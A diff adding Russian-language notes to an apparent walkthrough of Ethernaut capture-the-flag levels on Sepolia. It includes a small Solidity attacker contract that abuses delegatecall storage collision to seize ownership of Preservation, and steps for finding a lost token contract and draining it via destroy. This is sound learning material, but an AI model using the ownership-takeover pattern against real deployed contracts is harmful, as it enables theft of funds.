@@ -273,10 +273,35 @@ https://sepolia.etherscan.io/tx/0x01389af94bee37022fbd2b37fbd59ca53976b727f2a5b2
 
 
 ### 16. Preservation (****)
+Я бы не дал этой задаче 4 звезды.
+Кто-то решил вызывать библиотеки через delegatecall и таким образом переписывает локальный 0 слот.
+Значит мне нужно в него отправить адрес моего контракта где setTime(uint256 addr) будет переписывать 2й слот - адрес владельца
+```
+contract Timekeeper {
+  address public a;
+  address public b;
+  address public owner; 
+
+
+  function setTime(uint256 addr) public {
+    owner = address(uint160(addr));
+  }  
+}
+```
+>Preservation.setSecondTime(address(Timekeeper));
+>Preservation.setFirstTime(player);
 
 
 ### 17. Recovery (***)
+Из зацепок только sepolia etherscan. Иду смотреть по адресу контракта Recovery
+https://sepolia.etherscan.io/address/0xF365Fa9536Be2c728E558bA9C6f34749f3416182#internaltx
+Далее по транзакции видно 
+Transfer 0.001 ETH From 0xa3e731...e56104d6 To 0xAF98ab...7acAB048
+Transfer 0.001 ETH From 0xAF98ab...7acAB048 To 0x8F35d7...64a80C45 << Вот, что я ищу!
 
+0x8F35d71602e7868DD9D7e3a3fdeF155f64a80C45 - адрес SimpleToken
+Можно вызвать в remix его функцию transfer или destroy
+Остальсь понять на какой адрес отправлять эфир. Отправлю на свой адрес
 
 ### 18. MagicNumber (***)
 
